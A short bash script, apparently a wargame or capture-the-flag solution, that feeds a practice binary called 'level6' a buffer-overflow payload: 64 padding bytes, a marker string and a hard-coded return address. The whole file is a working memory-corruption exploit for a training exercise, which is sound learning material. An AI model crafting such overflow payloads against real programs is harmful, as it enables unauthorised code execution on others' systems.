#!/usr/bin/env bash

./level6 $(python -c 'print "X" * 64 + "METADATA" + "\x54\x84\x04\x08"')
